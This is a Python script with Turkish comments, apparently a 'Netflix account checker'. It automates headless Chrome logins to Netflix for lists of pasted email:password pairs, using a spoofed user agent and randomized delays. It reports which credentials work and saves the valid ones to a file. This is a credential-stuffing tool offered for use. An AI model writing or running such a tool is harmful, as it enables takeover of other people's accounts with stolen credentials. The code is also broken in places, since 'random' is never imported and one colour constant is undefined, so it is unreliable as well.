# Gerekli kütüphane: pip install selenium
# Ayrıca sisteminizde kurulu Chrome sürümüyle uyumlu chromedriver'ın
# PATH'e eklenmiş olması veya bu betikle aynı dizinde bulunması gerekir.
# ChromeDriver İndirme: https://chromedriver.chromium.org/downloads

import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service # Selenium 4+ için
from selenium.webdriver.chrome.options import Options
from time import sleep
import sys # Hata mesajları için

# Orijinal dosyadaki ASCII Sanatı
# Bu banner, main.py'deki banner'dan farklıdır.
ascii_art = """
 _    _      ____    __
| |  | |   .'    '. /  |
| |__| |_ |  .--.  |`| |
|____   _|| |    | | | |
    _| |_ |  `--'  |_| |_
   |_____| '.____.'|_____|
"""

# Renk kodları (isteğe bağlı, terminal destekliyorsa)
C_RED = '\033[91m'
C_GREEN = '\033[92m'
C_YELLOW = '\033[93m'
C_CYAN = '\033[96m'
C_RESET = '\033[0m'

# Hesapları kontrol etme fonksiyonu (Düzeltilmiş WebDriver kullanımı ile)
def start_program(accounts):
    active_accounts = []
    driver = None # Driver'ı başlangıçta None olarak ayarlayın

    try:
        # Chrome seçenekleri
        options = Options()
        options.add_argument("--headless")
        options.add_argument("--log-level=3")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36")

        # WebDriver'ı başlatma (chromedriver PATH'de veya aynı dizinde varsayılır)
        try:
            # Selenium 4 ve sonrası için Service nesnesi
            # chromedriver yürütülebilir dosyasının adını belirtmek genellikle yeterlidir
            service = Service()
            driver = webdriver.Chrome(service=service, options=options)
            print(f"{C_CYAN}Tarayıcı başarıyla başlatıldı (headless modda).{C_RESET}")
        except Exception as webdriver_error:
            print(f"{C_RED}HATA: WebDriver (chromedriver) başlatılamadı!{C_RESET}")
            print(f"{C_YELLOW}Detay: {webdriver_error}{C_RESET}")
            print(f"{C_YELLOW}Lütfen ChromeDriver'ın kurulu ve PATH'de olduğundan veya betikle aynı dizinde olduğundan emin olun.{C_RESET}")
            print(f"{C_YELLOW}Ayrıca Google Chrome tarayıcınızın kurulu olması gerekir.{C_RESET}")
            return # WebDriver başlatılamazsa fonksiyondan çık

        print(f"{C_CYAN}Netflix hesapları kontrol ediliyor...{C_RESET}")

        for account_info in accounts:
            # Girdiyi ayrıştır (hem virgül hem de iki nokta üst üste kabul et)
            email, password = None, None
            if ',' in account_info:
                parts = account_info.split(',', 1)
                if len(parts) == 2:
                    email, password = parts[0].strip(), parts[1].strip()
            elif ':' in account_info: # İki nokta üst üste formatını da destekle
                 parts = account_info.split(':', 1)
                 if len(parts) == 2:
                    email, password = parts[0].strip(), parts[1].strip()

            if not email or not password:
                print(f"{C_YELLOW}Geçersiz format atlanıyor: {account_info}{C_RESET}")
                continue

            try:
                # Netflix giriş sayfası
                print(f"Kontrol ediliyor: {email}")
                driver.get("https://www.netflix.com/login")
                # Sayfanın ve elementlerin yüklenmesi için daha cömert bekleme süreleri
                time.sleep(random.uniform(3, 5))

                # Elementleri bulma (ID'ler veya Name'ler değişebilir, daha sağlam seçiciler gerekebilir)
                try:
                    # Önce ID ile dene
                    try:
                        email_field = driver.find_element(By.ID, "id_userLoginId")
                        password_field = driver.find_element(By.ID, "id_password")
                    except:
                        # ID yoksa Name ile dene
                        email_field = driver.find_element(By.NAME, "userLoginId")
                        password_field = driver.find_element(By.NAME, "password")

                    email_field.clear()
                    email_field.send_keys(email)
                    time.sleep(random.uniform(0.5, 1.0))
                    password_field.clear()
                    password_field.send_keys(password)
                    time.sleep(random.uniform(0.5, 1.0))
                    password_field.send_keys(Keys.RETURN)
                    time.sleep(random.uniform(5, 7)) # Giriş sonucunu beklemek için

                    # Başarı kontrolü (URL veya sayfa içeriğine göre)
                    current_url = driver.current_url.lower()
                    page_title = driver.title.lower()
                    page_source = driver.page_source.lower()

                    if "browse" in current_url or "profilesgate" in current_url or "who's watching" in page_title:
                        print(f"{C_GREEN}[+] Başarılı: {email} | Şifre: {password}{C_RESET}")
                        active_accounts.append(f"{email}:{password}")
                    elif "incorrect password" in page_source or "yanlış şifre" in page_source:
                         print(f"{C_RED}[-] Şifre Hatalı: {email}{C_RESET}")
                    elif "cannot find an account with this email address" in page_source or "bu e-posta adresiyle bir hesap bulamıyoruz" in page_source:
                         print(f"{C_RED}[-] Hesap Bulunamadı: {email}{C_RESET}")
                    else:
                        # Diğer durumlar (CAPTCHA, limit vb.)
                        print(f"{C_YELLOW}[?] Belirsiz Durum: {email} - Başlık: {driver.title}{C_RESET}")
                        # Hata ayıklama için ekran görüntüsü alma (isteğe bağlı)
                        # driver.save_screenshot(f"error_{email}.png")

                except Exception as login_error:
                    print(f"{C_YELLOW}[!] Giriş Elementi Hatası ({email}): {login_error}{C_RESET}")
                    # Netflix sayfa yapısını değiştirmiş olabilir

            except Exception as e:
                print(f"{C_RED}[!] Hesap Kontrol Hatası ({email}): {e}{C_RESET}")

        # Tarama bittiğinde
        print(f"\n{C_BLUE}Tarama bitti!{C_RESET}")
        print(f"{C_GREEN}Aktif Hesaplar (Email:Şifre):{C_RESET}")
        if active_accounts:
            for acc in active_accounts:
                print(acc)
            # Aktif hesapları dosyaya yazma
            try:
                with open("aktif_netflix_hesaplari.txt", "w", encoding="utf-8") as f:
                    for acc in active_accounts:
                        f.write(acc + "\n")
                print(f"\n{C_CYAN}Aktif hesaplar 'aktif_netflix_hesaplari.txt' dosyasına kaydedildi.{C_RESET}")
            except Exception as file_error:
                print(f"\n{C_RED}Dosyaya yazma hatası: {file_error}{C_RESET}")
        else:
            print(f"{C_YELLOW}Hiçbir aktif hesap bulunamadı.{C_RESET}")

    except Exception as general_error:
        print(f"{C_RED}Genel bir hata oluştu: {general_error}{C_RESET}")

    finally:
        if driver:
            driver.quit() # Hata olsa bile tarayıcıyı kapat
            print(f"{C_CYAN}Tarayıcı kapatıldı.{C_RESET}")

# Ana program (Orijinal arayüzü koruyarak)
def main():
    # --- Orijinal Banner ve Menü/Arayüz ---
    print(ascii_art)  # <<< Orijinal ASCII Banner Yazdırılıyor
    print("Netflix Hesap Checker Tool")
    # Orijinal Menü/Giriş Talimatları
    print("Hesap E-posta ve Şifrelerini (E-posta,Şifre veya E-posta:Şifre şeklinde) girin,")
    print("her satıra bir hesap gelecek şekilde yapıştırın.")
    print("Hesapları bitirdiğinizde 'done' yazıp 'Enter' tuşuna basın.\n")
    # --- Bitti: Orijinal Banner ve Menü/Arayüz ---

    accounts = []
    print("Hesap bilgilerini girin veya yapıştırın:")
    while True:
        try:
            # Kullanıcıdan satır satır giriş al
            account_info = input("> ").strip()
            if account_info.lower() == 'done':
                break
            if account_info: # Boş satırları ekleme
                accounts.append(account_info)
        except KeyboardInterrupt:
             print("\nÇıkılıyor...")
             return
        except EOFError: # Dosya sonu veya Ctrl+D durumu
             break

    if not accounts:
         print("Hiç hesap girilmedi.")
         return

    # Hesapları kontrol etme işlemi
    start_program(accounts)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C_RED}İşlem kullanıcı tarafından iptal edildi.{C_RESET}")
    except Exception as e:
        print(f"\n{C_RED}Beklenmedik bir hata oluştu: {e}{C_RESET}")